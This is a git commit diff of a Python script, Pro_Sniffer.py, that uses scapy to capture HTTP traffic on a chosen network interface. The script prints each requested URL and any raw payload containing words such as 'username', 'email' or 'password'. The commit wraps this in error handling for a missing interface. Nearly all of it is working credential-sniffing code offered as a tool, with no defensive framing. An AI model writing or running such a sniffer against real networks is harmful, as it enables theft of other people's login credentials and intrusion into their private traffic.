f936a436af0f0dd7f8fc84b560335bf5c30b3885
Sarthak044 <46262012+Sarthak044@users.noreply.github.com>
2021-01-22 00:58:10 +0530

    Update Pro_Sniffer.py

--- Pro_Sniffer.py
+++ Pro_Sniffer.py
@@ -5,29 +5,37 @@ from scapy.layers import http
 fig = Figlet(font='greek')
 print(fig.renderText("ProGod04"))
 
-def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=processed_packet)
+try:
+    def sniff(interface):
+        scapy.sniff(iface=interface, store=False, prn=processed_packet)
+        
+    def get_url(packet):
+        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
-def get_url(packet):
-    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    def info(packet):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords =["username", "Login", "email", "password", "login", "pass", "user"]# You can add more keywords
+            for i in keywords:
+                if i in str(load):
+                    return load
 
-def info(packet):
-    if packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
-        keywords =["username", "Login", "email", "password", "login", "pass", "user"] #You can add more keywords if you like to
-        for i in keywords:
-            if i in str(load):
-                return load
-
-def processed_packet(packet):
+    def processed_packet(packet):
    
-    if packet.haslayer(http.HTTPRequest):
-        url = get_url(packet)
-        print("[+] HTTP Req --> " + url.decode())
-        login_info = info(packet)
-        if login_info:
-            print("\n\n[+]Usernames/Passwords -->" + login_info.decode() + "\n\n")
+        if packet.haslayer(http.HTTPRequest):
+            url = get_url(packet)
+            print("[+] HTTP Req --> " + url.decode())
+            login_info = info(packet)
+            if login_info:
+                print("\n\n[+]Usernames/Passwords -->" + login_info.decode() + "\n\n")
 
-interface=input("Enter the Interface you want to sniff traffic on : \n")
-print("[+] Started Sniffing on --> " + interface + "\n Hit CTRL+C to exit out of the sniffer" )
-sniff(interface)
+
+    interface=input("Enter the Interface you want to sniff traffic on : \n")    
+  
+    print("[+] Started sniffing on --> " + interface)
+    sniff(interface)
+    
+except OSError:
+    print("[-] Could Not start the Sniffer")
+    print("\n\n-----------------Interface/Device Not Found...Exiting Try again--------------------------------\n\n")
+    exit()
